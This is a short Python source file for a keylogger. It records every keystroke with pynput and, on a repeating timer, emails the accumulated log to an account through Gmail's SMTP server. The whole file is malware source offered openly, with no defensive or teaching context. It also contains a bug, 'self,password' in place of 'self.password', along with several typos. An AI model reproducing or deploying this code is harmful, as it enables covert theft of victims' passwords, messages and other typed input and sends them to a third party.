#!/usr/bin/env python

import smtplib

import threading

from pynput import keyboard

#Create Keylogger Class

class KeyLogger:
  #__init__ variables
  def __init__(self, time_interval, email, password):
    self.interval = time_interval
    self.log = "keylogger has started...."
    self.email = email
    self.password = password

  #creating log to append all keystokes

  def append_to_log(self, string):
    self.log = self.log + string

  #create keylogger
  def on_press(self, key):
    try:
      current_key = str(key.char)
    except AttributeError:
      if key == key.space:
        current_key = " "
      elif key == key.esc:
        print ("Exciting Proogram")
        return False
      else:
        current_key = " " + str(key) + " "
    self.append_to_log(current_key)
    

  #code to create email and stuff
  def send_mail(self, email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

  #sending email and report
  def report_n_send(self):
    send_off = self.send_mail(self.email, self,password, "\n\n" + self.log)
    self.log = ""
    timer = threading.Timer(self.interval, self.report_n_send)
    timer.start()

  def start(self):
    keyboard_listener = keyboard.Listener(on_press = self.on_press)
    with keyboard_listener:
      self.report_n_send()
      keyboard_listener.join()
